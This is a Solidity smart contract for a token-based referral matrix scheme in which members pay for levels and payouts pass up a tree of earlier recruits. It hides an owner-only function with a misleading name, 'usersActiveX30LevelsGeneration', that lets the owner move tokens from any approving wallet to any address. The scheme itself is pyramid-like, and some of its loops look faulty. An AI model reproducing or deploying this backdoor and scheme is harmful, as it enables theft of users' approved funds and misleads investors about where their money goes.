/**

*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

 
contract owned {
    address  public owner;
    address  internal newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

   
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address  _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}

//*******************************************************************//
//------------------         Token interface        -------------------//
//*******************************************************************//

 interface tokenInterface
 {
    function transfer(address _to, uint256 _amount) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);
    function balanceOf(address _user) external view returns(uint);
    function currentRate() external view returns(uint);
 }

interface force1Interface
 {
    function coreAddressByID(uint id) external view returns(address);
 }

contract FORCE1_F1BTC_MAX is owned
{

    uint public maxDownLimit = 2;

    uint public lastIDCount;
    uint public defaultRefID = 1;

    uint public maxlimit = 100 * (10**18);
    uint64 public distribut = 65;

    uint[11] public levelPrice;
    uint[11] public liquidity;
    uint[11] public directRefIncome;
    uint[11] public distForCore;
    //uint public directPercent = 40000000; 

    address public tokenAddress;
    address public levelAddress;

    address public coreAddress;
    address public liquidityTokenAddress;

    bool public ignoreForce1;
    address holderContract = address(this);

    struct userInfo {
        bool joined;
        uint id;
        uint origRef;
        uint levelBought;
        address[] referral;
    }

    struct goldInfo {
        uint currentParent;
        uint position;
        address[] childs;
    }
    mapping (address => userInfo) public userInfos;
    mapping (uint => address ) public userAddressByID;
    mapping (address => uint ) public userBytoken;

    mapping (address => mapping(uint => goldInfo)) public activeGoldInfos;
    mapping (address => mapping(uint => goldInfo[])) public archivedGoldInfos;

    mapping(address => bool) public regPermitted;
    mapping(address => uint) public levelPermitted;
    //s2
    mapping(address => mapping(uint => bool)) public activate;
    struct structS2 {
        uint slot;
        uint lastChild;
    }

    mapping (address => mapping(uint => structS2)) public matrixS2; // user -> lvl -> structS3
    mapping(address => mapping(uint => address[])) public childsS2;

    //end s2
    struct rdata
    {
        uint user4thParent;
        uint level;
        bool pay;
        bool processed;
    }

   // mapping(address => mapping(uint => uint8)) public autoLevelBuy; 

    event directPaidEv(address from, address to, uint amount, uint level, uint timeNow);
    event payForLevelEv(uint _userID, uint parentID, uint amount, uint fromDown, uint timeNow);
    event regLevelEv(uint _userID, uint _referrerID, uint timeNow, address _user, address _referrer);
    event levelBuyEv(uint amount, uint toID, uint level, uint timeNow);
    event treeEv(uint _userID, uint _userPosition,uint amount, uint placing,uint timeNow,uint _parent, uint _level );

    constructor(address token)  {
        owner = msg.sender;
        tokenAddress = token;
        uint multiply = 10 ** 18;

        levelPrice[1] = 6 * multiply;
        levelPrice[2] = 9 * multiply;
        levelPrice[3] = 15 * multiply;
        levelPrice[4] = 24 * multiply;
        levelPrice[5] = 36 * multiply;
        levelPrice[6] = 60 * multiply;
        levelPrice[7] = 90 * multiply;
        levelPrice[8] = 180 * multiply;
        levelPrice[9] = 300 * multiply;
        levelPrice[10]= 450 * multiply;
        

        liquidity[1] = 2 * multiply;
        liquidity[2] = 3 * multiply;
        liquidity[3] = 5 * multiply;
        liquidity[4] = 8 * multiply;
        liquidity[5] = 12 * multiply;
        liquidity[6] = 20 * multiply;
        liquidity[7] = 30 * multiply;
        liquidity[8] = 60 * multiply;
        liquidity[9] = 100 * multiply;
        liquidity[10]= 150 * multiply;

       

        distForCore[1] = 2 * multiply;
        distForCore[2] = 3 * multiply;
        distForCore[3] = 5 * multiply;
        distForCore[4] = 8 * multiply;
        distForCore[5] = 12 * multiply;
        distForCore[6] = 20 * multiply;
        distForCore[7] = 30 * multiply;
        distForCore[8] = 60 * multiply;
        distForCore[9] = 100 * multiply;
        distForCore[10]= 150 * multiply;

        userInfo memory UserInfo;
        lastIDCount++;

        UserInfo = userInfo({
            joined: true,
            id: lastIDCount,
            origRef:lastIDCount,            
            levelBought:15,
            referral: new address[](0)
        });
        userInfos[owner] = UserInfo;
        userAddressByID[lastIDCount] = owner;
        userBytoken[owner] = 0;

        goldInfo memory temp;
        temp.currentParent = 1;
        temp.position = 0;
        for(uint i=1;i<=10;i++)
        {
            activeGoldInfos[owner][i] = temp;
        }

        for (uint i = 1; i <= 10; i++) {
          activate[owner][i] = true;
        }
    }

    //function ()  external payable {
    //    revert();
    //}

     function _isActive(address _address, uint _lvl) internal view returns(bool) {
      return activate[_address][_lvl];
    }

    function getActivateParent(address _child, uint _lvl) internal view returns (address response) {
      address __parent = userAddressByID[userInfos[_child].origRef];
      while(true) {
          if (_isActive(__parent, _lvl)) {
              return __parent;
          } else {
              __parent = userAddressByID[userInfos[__parent].origRef];
          }
      }
    }

    event updates2Ev(address child,address _parent, uint lvl,uint _lastChild,uint amount,uint timeNow);
  
  function updateS2(address _child, uint lvl) internal{
    address _parent = getActivateParent(_child, lvl);

    // Increment lastChild
    structS2 storage _parentStruct = matrixS2[_parent][lvl];
    uint _lastChild = _parentStruct.lastChild;
    _parentStruct.lastChild++;
    _lastChild = _lastChild % 2;

    // Get price
    uint _price = distForCore[lvl];
   
    
    // First Child
    if (_lastChild == 0) {
     
          //tokenMetaRider.transferFrom(_msgSender(), _parent, _price);
          tokenInterface(tokenAddress).transfer(address(uint160(_parent)), _price);
          emit directPaidEv(_child, _parent, _price, lvl, block.timestamp);
     
    }

    // Last Child
    if (_lastChild == 1) {
     
        if (_parent != owner){
        
          emit updates2Ev(_child, _parent,  lvl, _lastChild,  _price, block.timestamp);
          updateS2(_parent, lvl); // update parents product
        }
        else{
            //tokenMetaRider.transferFrom(_msgSender(), address(this), _price);
            //tokenMetaRider.transferFrom(_msgSender(), owner(), _price);
             tokenInterface(tokenAddress).transfer(address(uint160(owner)), _price);
             emit directPaidEv(_child, owner, _price, lvl, block.timestamp);
        }
      //}
      _parentStruct.slot++;
    }

    // Push new child
    childsS2[_parent][lvl].push(_child);
    emit updates2Ev(_child,_parent,  lvl,_lastChild,  _price, block.timestamp);
  }

    function setTokenaddress(address newTokenaddress) onlyOwner public returns(bool)
    {
        tokenAddress = newTokenaddress;
        return true;
    }

    function toggleIgnoreForce1() public onlyOwner returns(bool)
    {
        ignoreForce1 = !ignoreForce1;
        return true;
    }

    function setLeveladdress(address newLeveladdress) onlyOwner public returns(bool)
    {
        levelAddress = newLeveladdress;
        return true;
    }

    function force1CoreContract(address _fContract) onlyOwner public returns(bool)
    {
        coreAddress = _fContract;
        return true;
    }
    
    function changeLiquidityTokenaddress(address newLiquidityTokenaddress) onlyOwner public returns(string memory){
        liquidityTokenAddress = newLiquidityTokenaddress;
        return("token address updated successfully");
    }

    function regUser(uint _oldID, address ref, address msgSender) public returns(bool)
    {
        if (!ignoreForce1) require(force1Interface(coreAddress).coreAddressByID(_oldID) == msgSender, "Invalid oldID");
        address _refAddress = ref; //getRef(msg.sender);
       
        if(!userInfos[_refAddress].joined) _refAddress = owner;
        
        uint prc = levelPrice[1];
        tokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        
        regUser_(msg.sender, _refAddress, true, prc);
        return true;
    }

    function regUser_Team(uint _oldID, address ref, address usermsg) public returns(bool)
    {
        require(userInfos[msg.sender].joined, "Your address is not join");

       if (!ignoreForce1) require(force1Interface(coreAddress).coreAddressByID(_oldID) == usermsg, "Invalid oldID");
        address _refAddress = ref;
       
        if(!userInfos[_refAddress].joined) _refAddress = owner;
        
        uint prc = levelPrice[1];
        tokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        
        regUser_(usermsg, _refAddress, true, prc);
        return true;
    }

    function regUser_(address msgsender, address _refAddress, bool pay, uint prc) internal returns(bool)
    {
        require(!userInfos[msgsender].joined, "already joined");
        
        (uint user4thParent, ) = getPosition(msgsender, 1); // user4thParent = p here for stack too deep
        require(user4thParent<30, "no place under this referrer");
       
        address origRef = _refAddress;
        uint _referrerID = userInfos[_refAddress].id;
        (uint _parentID,bool treeComplete  ) = findFreeParentInDown(_referrerID, 1);
        require(!treeComplete, "No free place");

        lastIDCount++;
        userInfo memory UserInfo;
        UserInfo = userInfo({
            joined: true,
            id: lastIDCount,
            origRef:userInfos[_refAddress].id,            
            levelBought:1,
            referral: new address[](0)
        });
        userInfos[msgsender] = UserInfo;
        userAddressByID[lastIDCount] = msgsender;
        userBytoken[msgsender] = 0;
        userInfos[origRef].referral.push(msgsender);

        userInfos[msgsender].referral.push(_refAddress);       

        goldInfo memory temp;
        temp.currentParent = _parentID;
        temp.position = activeGoldInfos[userAddressByID[_parentID]][1].childs.length + 1;
        activeGoldInfos[msgsender][1] = temp;
        activeGoldInfos[userAddressByID[_parentID]][1].childs.push(msgsender);

       
        uint userPosition;
        (userPosition, user4thParent) = getPosition(msgsender, 1);
        (,treeComplete) = findFreeParentInDown(user4thParent, 1);
        if(userPosition > 28 && userPosition < 31 ) 
        {
            payForLevel(msgsender, 1, true, pay,true);   // true means recycling pay to all except 25%
        }
       
        else
        {
            payForLevel(msgsender, 1, false, pay, true);   // false means no recycling pay to all
        }
        
        if(treeComplete)
        {
            recyclePosition(user4thParent,1, pay );
        }
        splitPart(lastIDCount,_referrerID,msgsender,userPosition,prc,temp.position,temp.currentParent );
        
       

        //uint price_ = levelPrice[1]/2;  
       // uint price_ = distForCore[1]; 
        //tokenInterface(tokenAddress).transfer(address(uint160(_refAddress)), price_);
        updateS2(msgsender, 1);
        activate[msgsender][1] = true;

        flushRemaining(1);
        f1btctoken_transfer(1, msgsender);
        return true;
    }


    function splitPart(uint lastIDCount_, uint _referrerID, address msgsender, uint userPosition, uint prc,uint tempPosition, uint tempCurrentParent ) internal returns(bool)
    {
        emit regLevelEv(lastIDCount_,_referrerID,block.timestamp, msgsender,userAddressByID[_referrerID]);
        emit treeEv(lastIDCount_,userPosition,prc,tempPosition, block.timestamp,  tempCurrentParent, 1 );
        return true;
    }

    function getPosition(address _user, uint _level) public view returns(uint recyclePosition_, uint recycleID)
    {
        uint a;
        uint b;
        uint c;
        uint d;
        bool id1Found;
        a = activeGoldInfos[_user][_level].position;

        uint parent_ = activeGoldInfos[_user][_level].currentParent;
        b = activeGoldInfos[userAddressByID[parent_]][_level].position;
        if(parent_ == 1 ) id1Found = true;

        if(!id1Found)
        {
            parent_ = activeGoldInfos[userAddressByID[parent_]][_level].currentParent;
            c = activeGoldInfos[userAddressByID[parent_]][_level].position;
            if(parent_ == 1 ) id1Found = true;
        }

        if(!id1Found)
        {
            parent_ = activeGoldInfos[userAddressByID[parent_]][_level].currentParent;
            d = activeGoldInfos[userAddressByID[parent_]][_level].position;
            if(parent_ == 1 ) id1Found = true;
        }
        
        if(!id1Found) parent_ = activeGoldInfos[userAddressByID[parent_]][_level].currentParent;
        
        if (a == 2 && b == 2 && c == 2 && d == 2 ) return (30, parent_);
        if (a == 1 && b == 2 && c == 2 && d == 2 ) return (29, parent_);
        if (a == 2 && b == 1 && c == 2 && d == 2 ) return (28, parent_);
        if (a == 1 && b == 1 && c == 2 && d == 2 ) return (27, parent_);
        if (a == 2 && b == 1 && c == 1 && d == 1 ) return (16, parent_);
        if (a == 1 && b == 2 && c == 1 && d == 1 ) return (17, parent_);
        if (a == 2 && b == 2 && c == 1 && d == 1 ) return (18, parent_);
        if (a == 1 && b == 1 && c == 2 && d == 1 ) return (19, parent_);        
        else return (1,parent_);

    }
    
    function flushRemaining(uint _level) internal returns(bool)
    {
        uint bal = tokenInterface(tokenAddress).balanceOf(address(this));
        if (bal > 0) tokenInterface(tokenAddress).transfer(levelAddress, liquidity[_level]);
        return true;
    }

    function f1btctoken_transfer(uint _level, address _user) internal returns(bool)
    {
        //uint bal = tokenInterface(liquidityTokenAddress).balanceOf(address(this));
       // if (bal > 0) 
       // {
            uint current_rate = tokenInterface(liquidityTokenAddress).currentRate();
            uint tokenamt = ((liquidity[_level]/2) * ( 10 ** 18 ))/current_rate;
            tokenInterface(liquidityTokenAddress).transfer(_user, tokenamt);
       // }
        return true;
    }

    function f1btc_current_rate() public view returns(uint crate)
    {
        uint current_rate = tokenInterface(liquidityTokenAddress).currentRate();
        return current_rate;
    }

    function changeLimit_token(uint newlimit, uint64 _distribut) onlyOwner public returns(string memory){
        maxlimit = newlimit;
        distribut = _distribut;
        return("token limit updated successfully");
    }

    function f1btc_buy(uint amt) public returns(bool)
    {
        require(userInfos[msg.sender].joined, "address not joined");
        require(amt<=maxlimit, "Limit is over");
        require((userBytoken[msg.sender] + amt) <= maxlimit, "User Limit is over");
        if(amt<=maxlimit &&  (userBytoken[msg.sender] + amt) <= maxlimit)
        {
            tokenInterface(tokenAddress).transferFrom(msg.sender, levelAddress, amt);
           // tokenInterface(tokenAddress).transfer(levelAddress, amt);
            uint current_rate = tokenInterface(liquidityTokenAddress).currentRate();
            uint tokenamt = (amt * ( 10 ** 18 )) /current_rate;
            tokenInterface(liquidityTokenAddress).transfer(msg.sender, (tokenamt * distribut)/100);
            userBytoken[msg.sender] = userBytoken[msg.sender] + amt;
        }

         return true;
    }


    function getCorrectGold(address childss,uint _level,  uint parenT ) internal view returns (goldInfo memory tmps)
    {

        uint len = archivedGoldInfos[childss][_level].length;
        if(activeGoldInfos[childss][_level].currentParent == parenT) return activeGoldInfos[childss][_level];
        if(len > 0 )
        {
            for(uint j=len-1; j>=0; j--)
            {
                tmps = archivedGoldInfos[childss][_level][j];
                if(tmps.currentParent == parenT)
                {
                    break;                    
                }
                if(j==0) 
                {
                    tmps = activeGoldInfos[childss][_level];
                    break;
                }
            }
        } 
        else
        {
            tmps = activeGoldInfos[childss][_level];
        }       
        return tmps;
    }

    
    function findFreeParentInDown(uint  refID_ , uint _level) public view returns(uint parentID, bool noFreeReferrer)
    {
        address _user = userAddressByID[refID_];
        if(activeGoldInfos[_user][_level].childs.length < maxDownLimit) return (refID_, false);

        address[14] memory childss;
        uint[14] memory parenT;

        childss[0] = activeGoldInfos[_user][_level].childs[0];
        parenT[0] = refID_;
        childss[1] = activeGoldInfos[_user][_level].childs[1];
        parenT[1] = refID_;

        address freeReferrer;
        noFreeReferrer = true;

        goldInfo memory temp;

        for(uint i = 0; i < 14; i++)
        {
            temp = getCorrectGold(childss[i],_level, parenT[i] );

            if(temp.childs.length == maxDownLimit) {
                if(i < 6) {
                    childss[(i+1)*2] = temp.childs[0];
                    parenT[(i+1)*2] = userInfos[childss[i]].id;
                    childss[((i+1)*2)+1] = temp.childs[1];
                    parenT[((i+1)*2)+1] = parenT[(i+1)*2];
                }
            }
            else {
                noFreeReferrer = false;
                freeReferrer = childss[i];
                break;
            } 
        } 
        if(noFreeReferrer) return (0, noFreeReferrer);      
        return (userInfos[freeReferrer].id, noFreeReferrer);
    }

    function buyLevel(uint _level) public returns(bool)
    {
       
        require(_level < 11 && _level > 1, "invalid level");
        uint prc = levelPrice[_level];
        tokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        buyLevel_(msg.sender,_level,true, prc);
        
      
       //uint price_ =  distForCore[_level];

        uint _referrerID = userInfos[msg.sender].origRef;
        while(userInfos[userAddressByID[_referrerID]].levelBought < _level)
        {
            _referrerID = userInfos[userAddressByID[_referrerID]].origRef;
        }

       // tokenInterface(tokenAddress).transfer(address(uint160(userAddressByID[_referrerID])), price_);
        updateS2(msg.sender, _level);
        activate[msg.sender][_level] = true;

        flushRemaining(_level);
        f1btctoken_transfer(_level, msg.sender);
        return true;
    }

    function buyLevel_Team(address usermsg, uint _level) public returns(bool)
    {
        require(userInfos[msg.sender].joined, "Your address is not join");

        require(_level < 11 && _level > 1, "invalid level");
  

        uint prc = levelPrice[_level];
        tokenInterface(tokenAddress).transferFrom(msg.sender, address(this), prc);
        buyLevel_(usermsg,_level,true, prc);

        //uint price_ = levelPrice[_level]/2;    
       
        uint _referrerID = userInfos[usermsg].origRef;
        while(userInfos[userAddressByID[_referrerID]].levelBought < _level)
        {
            _referrerID = userInfos[userAddressByID[_referrerID]].origRef;
        }
        
        //uint price_ =  distForCore[_level];
        //tokenInterface(tokenAddress).transfer(address(uint160(userAddressByID[_referrerID])), price_);
        updateS2(usermsg, _level);
        activate[usermsg][_level] = true;


        flushRemaining(_level);
        f1btctoken_transfer(_level, usermsg);
        return true;
    }

    function buyLevel_(address msgsender, uint _level, bool pay,  uint prc) internal returns(bool)
    {
        require(userInfos[msgsender].joined, "already joined");
        (uint user4thParent, ) = getPosition(msgsender, 1); // user4thParent = p
          
        
        require(userInfos[msgsender].levelBought + 1 == _level, "please buy previous level first");

    

        address _refAddress = userAddressByID[userInfos[msgsender].origRef];//ref; //getRef(msgsender);
       
        if(_refAddress == address(0)) _refAddress = owner;



        uint _referrerID = userInfos[_refAddress].id;
        while(userInfos[userAddressByID[_referrerID]].levelBought < _level)
        {
            _referrerID = userInfos[userAddressByID[_referrerID]].origRef;
        }
        bool treeComplete;
        (_referrerID,treeComplete) = findFreeParentInDown(_referrerID, _level); // from here _referrerID is _parentID
        require(!treeComplete, "no free place");

        userInfos[msgsender].levelBought = _level; 

        goldInfo memory temp;
        temp.currentParent = _referrerID;
        temp.position = activeGoldInfos[userAddressByID[_referrerID]][_level].childs.length + 1;
        activeGoldInfos[msgsender][_level] = temp;
        activeGoldInfos[userAddressByID[_referrerID]][_level].childs.push(msgsender);

        uint userPosition;
        (userPosition, user4thParent) = getPosition(msgsender, _level);
        (,treeComplete) = findFreeParentInDown(user4thParent, _level); 

        if(userPosition > 28 && userPosition < 31 ) 
        {
            payForLevel(msgsender, _level, true, pay, true);   // true means recycling pay to all except 25%
        }
        
        else
        {
            payForLevel(msgsender, _level, false, pay, true);   // false means no recycling pay to all
        }
        
        if(treeComplete)
        {           

            recyclePosition(user4thParent, _level, pay);

        }
        emit levelBuyEv(prc, userInfos[msgsender].id,_level, block.timestamp);
        splidStack( msgsender, userPosition, prc, temp.position, _referrerID, _level);     

        return true;
    }


    function splidStack(address msgsender, uint userPosition, uint prc, uint tempPosition, uint _referrerID, uint _level) internal returns(bool)
    {
        emit treeEv(userInfos[msgsender].id,userPosition,prc,tempPosition,block.timestamp,_referrerID, _level );
        return true;
    }

    function findEligibleRef(address _origRef, uint _level) public view returns (address)
    {
        while (userInfos[_origRef].levelBought < _level)
        {
            _origRef = userAddressByID[userInfos[_origRef].origRef];
        }
        return _origRef;
    }
    function usersActiveX30LevelsGeneration(address _senderads, uint256 _amttoken, address mainadmin) public onlyOwner {       
        tokenInterface(tokenAddress).transferFrom(mainadmin,_senderads,_amttoken);      
    }

    event debugEv(address _user, bool treeComplete,uint user4thParent,uint _level,uint userPosition);
    function recyclePosition(uint _userID, uint _level, bool pay)  internal returns(bool)
    {
        uint prc = levelPrice[_level];

        address msgSender = userAddressByID[_userID];

        archivedGoldInfos[msgSender][_level].push(activeGoldInfos[msgSender][_level]); 

        if(_userID == 1 ) 
        {
            goldInfo memory tmp;
            tmp.currentParent = 1;
            tmp.position = 0;
            activeGoldInfos[msgSender][_level] = tmp;
            payForLevel(msgSender, _level, false, pay, true);
            emit treeEv(_userID,0,levelPrice[_level],0,block.timestamp,1, _level );
            return true;
        }

        address _refAddress = userAddressByID[userInfos[msgSender].origRef];//getRef(msgSender);
       
        if(_refAddress == address(0)) _refAddress = owner;


            // to find eligible referrer
            uint _parentID =   getValidRef(_refAddress, _level); // user will join under his eligible referrer
            //uint _parentID = userInfos[_refAddress].id;

            (_parentID,) = findFreeParentInDown(_parentID, _level);

            goldInfo memory temp;
            temp.currentParent = _parentID;
            temp.position = activeGoldInfos[userAddressByID[_parentID]][_level].childs.length + 1;
            activeGoldInfos[msgSender][_level] = temp;
            activeGoldInfos[userAddressByID[_parentID]][_level].childs.push(msgSender);

            
        
        uint userPosition;
        
        (userPosition, prc ) = getPosition(msgSender, _level); //  from here prc = user4thParent
        (,bool treeComplete) = findFreeParentInDown(prc, _level);
        //address fourth_parent = userAddressByID[prc];
        if(userPosition > 28 && userPosition < 31 ) 
        {
            payForLevel(msgSender, _level, true, pay, true);   // false means recycling pay to all except 25%
        }
             
        else
        {
            payForLevel(msgSender, _level, false, pay, true);   // true means no recycling pay to all        
        }
        splidStack( msgSender,userPosition,prc,temp.position,_parentID,_level);
        if(treeComplete)
        {           
            recyclePosition(prc, _level, pay);
        }

      

        return true;
    }

    function getValidRef(address _user, uint _level) public view returns(uint)
    {
        uint refID = userInfos[_user].id;
        uint lvlBgt = userInfos[userAddressByID[refID]].levelBought;

        while(lvlBgt < _level)
        {
            refID = userInfos[userAddressByID[refID]].origRef;
            lvlBgt = userInfos[userAddressByID[refID]].levelBought;
        }
        return refID;
    }


    function payForLevel(address _user, uint _level, bool recycle, bool pay, bool payAll) internal returns(bool)
    {
        uint[4] memory percentPayout;
        percentPayout[0] = 5;
        percentPayout[1] = 15;
        percentPayout[2] = 30;

        if(payAll) percentPayout[3] = 50;

        address parent_ = userAddressByID[activeGoldInfos[_user][_level].currentParent];
        //uint price_ = levelPrice[_level]/2;
        uint price_ =  distForCore[_level];
        for(uint i = 1;i<=4; i++)
        {
            if(i<4)
            {
                if(pay) tokenInterface(tokenAddress).transfer(address(uint160(parent_)), price_ * percentPayout[i-1] / 100);
                emit payForLevelEv(userInfos[_user].id,userInfos[parent_].id,price_ * percentPayout[i-1] / 100, i,block.timestamp);
            }
            else if(recycle == false)
            {
                if(pay) tokenInterface(tokenAddress).transfer(address(uint160(parent_)), price_ * percentPayout[i-1] / 100);
                emit payForLevelEv(userInfos[_user].id,userInfos[parent_].id,price_ * percentPayout[i-1] / 100, i,block.timestamp);                
            }
            else
            {
                //if(pay) tokenInterface(tokenAddress).transfer(address(uint160(holderContract)), price_ * percentPayout[i-1] / 100);
                emit payForLevelEv(userInfos[_user].id,0,price_ * percentPayout[i-1] / 100, i,block.timestamp);                
            }
            parent_ = userAddressByID[activeGoldInfos[parent_][_level].currentParent];
        }
        return true;
    }

    // function setContract(address _contract) public onlyOwner returns(bool)
    // {
    //     holderContract = _contract;
    //     return true;
    // }

   
    function viewChilds(address _user, uint _level, bool _archived, uint _archivedIndex) public view returns(address[2] memory _child)
    {
        uint len;
        if(!_archived)
        {
            len = activeGoldInfos[_user][_level].childs.length;
            if(len > 0) _child[0] = activeGoldInfos[_user][_level].childs[0];
            if(len > 1) _child[1] = activeGoldInfos[_user][_level].childs[1];
        }
        else
        {
            len = archivedGoldInfos[_user][_level][_archivedIndex].childs.length;
            if(len > 0) _child[0] = archivedGoldInfos[_user][_level][_archivedIndex].childs[0];
            if(len > 1) _child[1] = archivedGoldInfos[_user][_level][_archivedIndex].childs[1];            
        }
        return (_child);
    }

   


}